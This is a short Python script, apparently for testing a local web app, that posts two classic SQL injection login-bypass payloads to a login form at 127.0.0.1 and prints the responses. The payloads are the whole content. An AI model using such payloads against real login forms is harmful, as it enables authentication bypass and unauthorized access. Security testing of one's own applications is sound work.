import requests

def simulate_sql_injection():
    """
    Simulate SQL injection attack by sending malicious input.
    """
    url = 'http://127.0.0.1:5000/'
    malicious_inputs = [
        {'username': "' OR '1'='1", 'password': 'pass'},
        {'username': 'admin', 'password': "' OR '1'='1 --"},
    ]
    for data in malicious_inputs:
        try:
            response = requests.post(url, data=data)
            print(f"SQL Injection attempt: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    simulate_sql_injection()
